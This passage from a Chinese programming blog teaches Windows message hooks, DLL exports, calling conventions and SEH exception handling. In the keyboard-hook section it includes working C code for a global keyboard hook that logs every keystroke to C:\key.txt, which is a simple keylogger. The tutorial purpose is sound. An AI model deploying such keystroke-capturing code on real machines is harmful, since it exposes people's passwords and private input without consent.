<td>截获目标窗口处理完毕的消息</td>
</tr>
</tbody></table>
<h5 id="SetWindowsHookEx-设置钩子"><a href="#SetWindowsHookEx-设置钩子" class="headerlink" title="SetWindowsHookEx() 设置钩子"></a>SetWindowsHookEx() 设置钩子</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">HHOOK</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">SetWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//钩子类型</span></span></span><br><span class="line"><span class="params">    _In_ <span class="type">int</span> idHook,</span></span><br><span class="line"><span class="params">    <span class="comment">//回调函数地址</span></span></span><br><span class="line"><span class="params">    _In_ HOOKPROC lpfn,</span></span><br><span class="line"><span class="params">    <span class="comment">//实例句柄(包含有钩子函数)</span></span></span><br><span class="line"><span class="params">    _In_opt_ HINSTANCE hmod,</span></span><br><span class="line"><span class="params">    <span class="comment">//线程ID，欲勾住的线程（为0则不指定，全局）</span></span></span><br><span class="line"><span class="params">    _In_ DWORD dwThreadId)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="UnhookWindowsHookEx-卸载钩子"><a href="#UnhookWindowsHookEx-卸载钩子" class="headerlink" title="UnhookWindowsHookEx()卸载钩子"></a><code>UnhookWindowsHookEx()</code>卸载钩子</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">WINUSERAPI</span><br><span class="line">BOOL</span><br><span class="line">WINAPI</span><br><span class="line"><span class="title function_">UnhookWindowsHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">     <span class="comment">//要删除的钩子的句柄。这个参数是上一个函数SetWindowsHookEx的返回值.</span></span></span><br><span class="line"><span class="params">    _In_ HHOOK hhk)</span>;</span><br></pre></td></tr></table></figure>

<h5 id="CallNextHookEx-将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息"><a href="#CallNextHookEx-将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息" class="headerlink" title="**CallNextHookEx()** 将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息"></a><code>**CallNextHookEx()**</code> 将钩子信息传递到当前钩子链中的下一个子程，一个钩子程序可以调用这个函数之前或之后处理钩子信息</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LRESULT WINAPI <span class="title function_">CallNextHookEx</span><span class="params">(</span></span><br><span class="line"><span class="params">	HHOOK hhk, </span></span><br><span class="line"><span class="params">	<span class="type">int</span> nCode, </span></span><br><span class="line"><span class="params">	WPARAM wParam, </span></span><br><span class="line"><span class="params">	LPARAM lParam)</span>; </span><br></pre></td></tr></table></figure>

<hr>
<h4 id="Hook-demo"><a href="#Hook-demo" class="headerlink" title="Hook demo"></a>Hook demo</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	HMODULE dll = LoadLibraryA(<span class="string">&quot;keyboarddll.dll&quot;</span>);</span><br><span class="line">	<span class="type">void</span> (*HookStart)() = (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStart&quot;</span>);</span><br><span class="line">	<span class="type">void</span>(*HookStop)()= (<span class="type">void</span>(*)())GetProcAddress(dll, <span class="string">&quot;HookStop&quot;</span>);</span><br><span class="line">	HookStart();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入q退出卸载钩子\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (_getch() != <span class="string">&#x27;q&#x27;</span>);		</span><br><span class="line"></span><br><span class="line">	HookStop();</span><br><span class="line"></span><br><span class="line">	FreeLibrary(dll); <span class="comment">//卸载dll</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span>* p = <span class="literal">NULL</span>;   <span class="comment">//从右侧找 先定义一个指针</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (code &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!(lparam &amp; <span class="number">0x80000000</span>)) &#123;          <span class="comment">//32位下  最高位置为1  0x8000 0000</span></span><br><span class="line">            GetModuleFileNameA(<span class="literal">NULL</span>, szBuffer, <span class="keyword">sizeof</span>(szBuffer));</span><br><span class="line">            p = <span class="built_in">strrchr</span>(szBuffer,<span class="string">&#x27;\\&#x27;</span>);   <span class="comment">//从右边找</span></span><br><span class="line">            <span class="keyword">if</span> (!_strcmpi(p+<span class="number">1</span>, <span class="string">&quot;notepad.exe&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//给下一个钩子处理或者给应用程序</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">_declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                      DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                      LPVOID lpReserved</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    	hinstance = hModule;        <span class="comment">//在载入时获取  后面无法获取</span></span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用钩子hook住notepad  由于notepad是64位的，所有要编译成64位应用程序 使用x64dbg进行调试  （没法使用od调试  od只能调试32位）</p>
<p>打开x64dbg 点击 文件-&gt;附加 附加notepad.exe</p>
<p><img src="/posts/71edaaad/11-1.png" alt="img"></p>
<p>然后点击 选项-&gt;选项</p>
<p><img src="/posts/71edaaad/11-2.png" alt="img"></p>
<p>打开dll加载时发生暂停</p>
<p><img src="/posts/71edaaad/11-3.png" alt="img"></p>
<p>点击视图-&gt;模块  然后运行钩子 在notepad中随意输入一下 即可看到在x64dbg坐下方载入之前编写的dll</p>
<p><img src="/posts/71edaaad/11-4.png" alt="img"></p>
<hr>
<h4 id="在DLL编程中，导出函数为什么需要extern-“C”"><a href="#在DLL编程中，导出函数为什么需要extern-“C”" class="headerlink" title="在DLL编程中，导出函数为什么需要extern “C”?"></a>在DLL编程中，导出函数为什么需要extern “C”?</h4><p>使用<code>dumpbin </code> 查看dll的导出函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dumpbin .exports keyboarddll.dll</span><br></pre></td></tr></table></figure>

<p><img src="/posts/71edaaad/11-5.png" alt="img"></p>
<p>导出函数的修饰方式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在前面添加上<code>extern &quot;C&quot;</code> 后再次查看</p>
<p><img src="/posts/71edaaad/11-6.png" alt="img"></p>
<p>一般在编写dll的时候 都会使用到这个extern “C” </p>
<p>extern 为全局函数 ，“C”表示使用C编译器进行编译而不是C++。 C++的编译方式考虑了函数重载，所以对函数名进行了新的修饰，产生了所谓的破坏性命名。</p>
<p>在编译链接时，C++会按照自己的规则篡改函数的名称，这一过程称为“名字改编”。这会导致不同的编译器、不同的语言下调用dll发生问题。因此我们希望动态链接库文件在编译时，导出函数的名称不要发生变化，可以再定义导出函数时加上限定符：extern “C”</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _stdcall,函数导出符号为 _CreateNativeManager@0 : _+函数名+@+传参字节数</span></span><br><span class="line">	<span class="comment">//由于_stdcall是被调用方清理堆栈，所以函数符号里面包含了传参的信息</span></span><br><span class="line">	_declspec(dllexport) NativeManager* _stdcall <span class="title function_">CreateNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span> _stdcall <span class="title function_">ReleaseNativeManager</span><span class="params">()</span>;</span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_stdcall ExSetLogHandler)(LogHandler handler);</span><br><span class="line">	<span class="comment">//extern &quot;C&quot; + _cdecl,函数导出符号为 ReleaseNativeManager2 : 函数名 </span></span><br><span class="line">	<span class="comment">//由于_cdecl是调用方清理堆栈，所以只需要函数名就可以</span></span><br><span class="line">	_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager2)();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//不使用extern的情况下，是C++的导出方式，函数符号如下：</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager1@@YGXH@Z : ?+函数名+@@YG+返回类型+参数1类型...+@Z </span></span><br><span class="line"><span class="comment">//如果是_cdecl @YG变为@YA</span></span><br><span class="line"><span class="comment">//如果没有参数即参数为void,则以Z结尾，例如：</span></span><br><span class="line"><span class="comment">//?ReleaseNativeManager3@@YAXXZ : ?+函数名+@@YA+返回类型+XZ</span></span><br><span class="line"><span class="comment">//以上 X表示 void类型，H表示int参数类型</span></span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_stdcall ReleaseNativeManager1)(<span class="type">int</span> num);</span><br><span class="line">_declspec(dllexport) <span class="type">void</span>(_cdecl ReleaseNativeManager3)();</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="stdcall和-cdecl的区别"><a href="#stdcall和-cdecl的区别" class="headerlink" title="_stdcall和_cdecl的区别"></a>_stdcall和_cdecl的区别</h4><p>默认情况VC使用_cdecl 的函数调用方式 如果产生的dll只会给C/C++使用 那么没必要定义为__stdcall调用方式</p>
<p>如果要给Win32汇编使用 那么可以使用_stdcall</p>
<p>1）调用协议常用场合</p>
<p>__stdcall：Windows API默认的函数调用协议。</p>
<p>__cdecl：C/C++默认的函数调用协议。</p>
<p>2）函数参数入栈方式</p>
<p>__stdcall：函数参数由右向左入栈。</p>
<p>__cdecl：函数参数由右向左入栈。</p>
<p>3）栈内数据清除方式</p>
<p>__stdcall：函数调用结束后由被调用函数清除栈内数据。</p>
<p>__cdecl：函数调用结束后由函数调用者清除栈内数据。</p>
<p>4）C语言编译器函数名称修饰规则</p>
<p>__stdcall：编译后，函数名被修饰为“_functionname@number”。</p>
<p>__cdecl：编译后，函数名被修饰为“_functionname”。</p>
<p>5）C++语言编译器函数名称修饰规则</p>
<p>__stdcall：编译后，函数名被修饰为“?functionname@@YG******@Z”。</p>
<p>__cdecl：编译后，函数名被修饰为“?functionname@@YA******@Z”。</p>
<hr>
<h4 id="键盘钩子（一）"><a href="#键盘钩子（一）" class="headerlink" title="键盘钩子（一）"></a>键盘钩子（一）</h4><p>获取键值 然后报存到txt中（以下代码在测试时只能hook当前hook.exe的键盘记录…）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">HHOOK hHook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE hinstance = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT CALLBACK <span class="title function_">keyProc</span><span class="params">(<span class="type">int</span> code, WPARAM wparm, LPARAM lparam)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> szBuffer[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    FILE* p = <span class="literal">NULL</span>;   <span class="comment">//从右侧找 先定义一个指针</span></span><br><span class="line"></span><br><span class="line">    fopen_s(&amp;p, <span class="string">&quot;C:\\key.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam);</span><br><span class="line">    &#125;    </span><br><span class="line">   </span><br><span class="line">    GetKeyNameTextA(lparam, szBuffer, <span class="keyword">sizeof</span>(szBuffer)); <span class="comment">//获取键值  </span></span><br><span class="line">    fwrite(szBuffer, <span class="built_in">strlen</span>(szBuffer), <span class="number">1</span>, p);<span class="comment">//写入文件中</span></span><br><span class="line">    <span class="built_in">fputs</span>(<span class="string">&quot;\r\n&quot;</span>,p);    <span class="comment">//写入换行符  </span></span><br><span class="line">    fflush(p); <span class="comment">//实时刷新</span></span><br><span class="line">    fclose(p);    <span class="comment">//关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(hHook, code, wparm, lparam); <span class="comment">//给下一个钩子处理或者给应用程序</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStart</span><span class="params">()</span> &#123;     <span class="comment">//安装钩子</span></span><br><span class="line">    hHook = SetWindowsHookEx(WH_KEYBOARD, keyProc, hinstance, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="type">void</span> <span class="title function_">HookStop</span><span class="params">()</span> &#123;     <span class="comment">//卸载钩子</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hHook) &#123;</span><br><span class="line">        UnhookWindowsHookEx(hHook);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HMODULE hModule,</span></span><br><span class="line"><span class="params">                       DWORD  ul_reason_for_call,</span></span><br><span class="line"><span class="params">                       LPVOID lpReserved</span></span><br><span class="line"><span class="params">                     )</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        hinstance = hModule;        <span class="comment">//在载入时获取  后面无法获取</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="Referemces"><a href="#Referemces" class="headerlink" title="Referemces"></a>Referemces</h4><p>参考</p>
<p><a href="https://blog.csdn.net/liminwang0311/article/details/77170932">https://blog.csdn.net/liminwang0311/article/details/77170932</a></p>
<p><a href="https://blog.csdn.net/luoyu510183/article/details/93666808">https://blog.csdn.net/luoyu510183/article/details/93666808</a></p>
<p><a href="https://blog.csdn.net/qq_31209383/article/details/50849614">https://blog.csdn.net/qq_31209383/article/details/50849614</a></p>
<p><a href="https://github.com/Powerful99/Windows-Hook-">https://github.com/Powerful99/Windows-Hook-</a></p>
<p><a href="https://www.cnblogs.com/17bdw/p/6533065.html">https://www.cnblogs.com/17bdw/p/6533065.html</a></p>
<p><a href="https://blog.csdn.net/qq_43812868/article/details/109275872">https://blog.csdn.net/qq_43812868/article/details/109275872</a></p>
]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>C-10_SEH异常处理</title>
    <url>/posts/a3f022ab/</url>
    <content><![CDATA[<p>SEH 结构化异常处理</p>
<p><img src="/posts/a3f022ab/10-1.png" alt="img"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD32</span> &#123;</span></span><br><span class="line">    DWORD    ExceptionCode;	<span class="comment">//异常事件码</span></span><br><span class="line">    DWORD ExceptionFlags;	<span class="comment">//异常标志</span></span><br><span class="line">    DWORD ExceptionRecord;	<span class="comment">//下一个EXCEPTION_RECORD结构的地址</span></span><br><span class="line">    DWORD ExceptionAddress; <span class="comment">//引发了异常的指令的地址</span></span><br><span class="line">    DWORD NumberParameters;</span><br><span class="line">    DWORD ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD32, *PEXCEPTION_RECORD32;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-2.png" alt="img"></p>
<h4 id="使用筛选器处理异常"><a href="#使用筛选器处理异常" class="headerlink" title="使用筛选器处理异常"></a>使用筛选器处理异常</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">DWORD address = <span class="number">0</span>;</span><br><span class="line">DWORD WINAPI <span class="title function_">callback</span><span class="params">(EXCEPTION_POINTERS* lpExceptionInfo)</span> &#123;</span><br><span class="line">	EXCEPTION_RECORD* record = lpExceptionInfo-&gt;ExceptionRecord;</span><br><span class="line">	CONTEXT* context = lpExceptionInfo-&gt;ContextRecord;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* str = <span class="string">&quot;异常发生的位置:%08x,异常代码:%08x,异常标志:%08x&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	sprintf_s(buf, <span class="keyword">sizeof</span>(buf), str, context-&gt;Eip, record-&gt;ExceptionCode, record-&gt;ExceptionFlags);</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, buf, <span class="string">&quot;aaa&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	context-&gt;Eip += address - <span class="number">3</span>;</span><br><span class="line">	<span class="comment">//return EXCEPTION_CONTINUE_SEARCH //终止 有提示</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;  <span class="comment">//继续运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	SetUnhandledExceptionFilter(callback);  <span class="comment">// 筛选器   发生异常时先找 callback  在默认的异常处理之前进行筛选</span></span><br><span class="line"></span><br><span class="line">	_asm &#123;</span><br><span class="line">		mov eax, offset safe</span><br><span class="line">		sub eax, offset err</span><br><span class="line">		mov address, eax</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">		<span class="type">char</span>* p = <span class="number">0x0</span>;</span><br><span class="line">	err:	*p = <span class="number">20</span>; <span class="comment">//会触发空指针异常 c</span></span><br><span class="line">			MessageBoxA(<span class="number">0</span>, <span class="string">&quot;不可以执行&quot;</span>, <span class="string">&quot;不可以执行&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//_asm int 3</span></span><br><span class="line"></span><br><span class="line">	safe:</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;跳到安全地方执继续行&quot;</span>, <span class="string">&quot;跳到安全地方执继续行&quot;</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-3.png" alt="img"></p>
<p><img src="/posts/a3f022ab/10-4.png" alt="img"></p>
<hr>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">fn</span><span class="params">()</span> &#123;</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;安全地方执行&quot;</span>, <span class="string">&quot;安全地方执行&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	ExitProcess(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD address = <span class="number">0</span>;</span><br><span class="line">DWORD WINAPI <span class="title function_">callback</span><span class="params">(EXCEPTION_POINTERS* lpExceptionInfo)</span> &#123;</span><br><span class="line">	EXCEPTION_RECORD* record = lpExceptionInfo-&gt;ExceptionRecord;</span><br><span class="line">	CONTEXT* context = lpExceptionInfo-&gt;ContextRecord;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span>* str = <span class="string">&quot;异常发生的位置:%08x,异常代码:%08x,异常标志:%08x&quot;</span>;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">1024</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	sprintf_s(buf,<span class="keyword">sizeof</span>(buf),str,context-&gt;Eip, record-&gt;ExceptionCode, record-&gt;ExceptionFlags);</span><br><span class="line">	MessageBoxA(<span class="number">0</span>, buf, <span class="string">&quot;aaa&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	context-&gt;Eip =fn;</span><br><span class="line">	<span class="comment">//return EXCEPTION_CONTINUE_SEARCH //终止 有提示</span></span><br><span class="line">	<span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;  <span class="comment">//继续运行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">	SetUnhandledExceptionFilter(callback);  <span class="comment">// 筛选器   发生异常时先找 callback  在默认的异常处理之前进行筛选</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//_asm &#123;</span></span><br><span class="line">	<span class="comment">//	mov eax, offset safe</span></span><br><span class="line">	<span class="comment">//	sub eax, offset err</span></span><br><span class="line">	<span class="comment">//	mov address, eax</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//	char* p = 0x0;</span></span><br><span class="line"><span class="comment">//err:	*p = 20; //会触发空指针异常 c</span></span><br><span class="line"><span class="comment">//		MessageBoxA(0, &quot;不可以执行&quot;, &quot;不可以执行&quot;, 0);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">	_asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	MessageBoxA(<span class="number">0</span>, <span class="string">&quot;不可以执行&quot;</span>, <span class="string">&quot;不可以执行&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//safe:</span></span><br><span class="line"><span class="comment">//	MessageBoxA(0, &quot;跳到安全地方执继续行&quot;, &quot;跳到安全地方执继续行&quot;, 0);</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/posts/a3f022ab/10-5.png" alt="img"></p>
<hr>
<h4 id="TIB线程信息块"><a href="#TIB线程信息块" class="headerlink" title="TIB线程信息块"></a>TIB线程信息块</h4><p>TIB（Thread Information Block 线程信息块） 是保存线程基本信息的数据结构，user mode下位于TEB（Thread Enviroment Block线程环境块）的头部，TEB是操作系统为了保存每个线程的私有数据而创建的，所以每个线程都有TEB。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//线程信息块 保存线程的一些属性</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//seh链入口</span></span><br><span class="line">    PVOID StackBase;	<span class="comment">//栈基址</span></span><br><span class="line">    PVOID StackLimit;<span class="comment">//栈大小</span></span><br><span class="line">    PVOID SubSystemTib;</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(_MSC_EXTENSIONS)</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        PVOID FiberData;</span><br><span class="line">        DWORD Version;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    PVOID FiberData;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    PVOID ArbitraryUserPointer;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span>	<span class="comment">//指向TIB结构自身</span></span><br><span class="line">&#125; NT_TIB;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span>* <span class="title">Next</span>;</span><span class="comment">//指向下一个_EXCEPTION_REGISTRATION_RECORD</span></span><br><span class="line">    PEXCEPTION_ROUTINE Handler;     <span class="comment">//异常处理回调函数地址</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure>

<p>TIB永远放在FS段选择器指向的数据段的0偏移处 FS:[0]（x86平台的user mode上，fs:[0]总是指向TEB）</p>
<p>参考 <a href="https://bbs.pediy.com/thread-273332.htm">https://bbs.pediy.com/thread-273332.htm</a></p>
<hr>
<h4 id="SEH安装与卸载"><a href="#SEH安装与卸载" class="headerlink" title="SEH安装与卸载"></a>SEH安装与卸载</h4><p>SEH本质就是一个链表，所以我们只需要把我们写好的一个_EXCEPTION_REGISTRATION_RECORD结构插入到链表头就行。首先push指向我们handler的地址，然后<code>push fs:[0]</code>，此时就成功的创造了一个<code>_EXCEPTION_REGISTRATION_RECORD</code>。最后<code>mov fs:[0],esp</code>，就成功的修改了我们的TEB，相当于插入了一个新的节点。</p>
<p><img src="/posts/a3f022ab/10-6.png" alt="img"></p>
